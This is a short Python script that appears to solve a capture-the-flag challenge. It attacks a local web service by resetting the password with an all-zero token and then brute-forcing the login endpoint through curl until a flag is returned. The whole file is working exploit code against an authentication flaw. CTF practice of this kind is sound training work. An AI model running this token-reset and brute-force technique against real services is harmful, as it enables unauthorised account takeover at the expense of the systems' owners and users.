#!/usr/bin/env python3

import shlex
import subprocess
import json

ip = "127.0.0.1"
port = 5000

# Reset password with all-0x00 token
token = ''.join(['{:02x}'.format(0) for i in range(69)])
cmd = f'curl {ip}:{port}/api/reset/ -X POST -d \'{{"token": "{token}"}}\' -H \'Content-Type: application/json\''
args = shlex.split(cmd)
proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
assert(proc.returncode == 0)

# Bruteforce the password
for i in range(256):
    # Prepare curl command for login
    password = ''.join(['{:02x}'.format(i) for j in range(53)])
    cmd = f'curl {ip}:{port}/api/login/ -X POST -d \'{{"password": "{password}"}}\' -H \'Content-Type: application/json\''
    # Split into arguments and execute
    args = shlex.split(cmd)
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    # Check whether we got the flag
    out = json.loads(proc.stdout)
    if 'flag' in out:
        print(f"flag: {out['flag']}")
        break
